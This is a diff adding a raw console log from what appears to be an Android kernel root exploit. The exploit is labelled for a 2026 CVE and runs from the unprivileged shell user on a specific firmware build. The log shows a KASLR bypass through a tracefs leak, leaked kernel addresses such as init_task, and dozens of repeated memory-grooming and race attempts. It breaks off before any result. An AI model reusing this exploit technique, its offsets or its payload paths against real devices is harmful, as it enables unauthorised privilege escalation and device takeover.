@@ -1,0 +1,115 @@
+[app] root helper=/data/local/tmp/cve-2026-43499-root
+[app] loading verified payload=/data/local/tmp/f946b.so
+[33m[*] [0mpinning-test: choreography core resolved cpu=7
+[33m[*] [0mwork-dir healthy writable=1 label=u:object_r:shell_data_file:s0
+[33m[*] [0mwaiting for boot allocator quiet window seconds=86 uptime=34
+[32m[+] [0mpreload supervisor pid=11038 attempts=1 base_delay=20000 p0_timeout=115 timeout=600
+[32m[+] [0mexploit attempt=1/1 pid=12774 delay=25000 p0_offset=scan
+[32m[+] [0mstartup context pid=12774 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=12774 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=12774 label=f946b-F946BXXS7GZE5-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=12774 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001dddd0e bootid_data=ffffff8002c3a8c0 init_task=ffffff8002c85080 root_tg=ffffff8002d39ac0 sysctl_bootid=ffffff8002eec0b1
+[33m[*] [0mpinning-test: revalidated core cpu=5
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc008251d08 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc008261284 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0018955cc event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0018955cc event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0018955cc event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc001895b10 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=0000000020000001 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc001895b10 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00088000 hits=176
+[33m[*] [0mslide tracefs raw summary pages=8 bytes=32768 events=403 callers=403 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00088000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=12774 base=ffffffc008088000 slide=0000000000088000 data_mode=canonical
+[31m[-] [0mpin to core 5 failed errno=22; continuing unpinned
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0mpin to core 5 failed errno=22; continuing unpinned
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=116 max=539 (baseline 25)
+[33m[*] [0mcontrolled mm group opened attempt=1 group=0 base=ffffff8833190000 hint=0
+[33m[*] [0mcontrolled mm group attempt=1 group=0 base=ffffff8833190000 slot=20 count=1 hint=0
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=656 max=1874 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=624 max=1731 (baseline 6)
+[33m[*] [0mcontrolled mm group opened attempt=2 group=1 base=ffffff8835e30000 hint=0
+[33m[*] [0mcontrolled mm group attempt=2 group=1 base=ffffff8835e30000 slot=19 count=1 hint=0
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=701 max=1729 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=649 max=1632 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=629 max=1688 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=638 max=1632 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=654 max=1526 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=642 max=1625 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=651 max=1694 (baseline 6)
+[33m[*] [0mcontrolled mm group attempt=9 group=1 base=ffffff8835e30000 slot=8 count=8 hint=1
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=693 max=1979 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=640 max=1714 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=677 max=1748 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=625 max=1652 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=636 max=1646 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=610 max=1640 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=678 max=1797 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=625 max=1676 (baseline 6)
+[33m[*] [0mcontrolled mm group attempt=17 group=1 base=ffffff8835e30000 slot=28 count=16 hint=1
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=674 max=1670 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=619 max=1676 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=648 max=1679 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=685 max=2010 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=639 max=1662 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=693 max=1962 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=687 max=1633 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=620 max=1919 (baseline 6)
+[33m[*] [0mcontrolled mm group attempt=25 group=1 base=ffffff8835e30000 slot=13 count=24 hint=1
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=635 max=1851 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=663 max=1682 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=691 max=1728 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=645 max=1559 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=671 max=1710 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=632 max=1704 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=681 max=1887 (baseline 6)
+[33m[*] [0mcontrolled mm group attempt=32 group=1 base=ffffff8835e30000 slot=24 count=31 hint=1
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=673 max=1825 (baseline 6)
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=645 max=1781 (baseline 6)
+[33m[*] [0mcontrolled mm group opened attempt=33 group=2 base=ffffff8936278000 hint=0
+[33m[*] [0mcontrolled mm group attempt=33 group=2 base=ffffff8936278000 slot=21 count=1 hint=0
+[33m[*] [0mksnitch pile-up waiters=2048 (wanted 2048)
+[33m[*] [0mksnitch pile-up self-measure min=652 max=1727 (baseline 6)
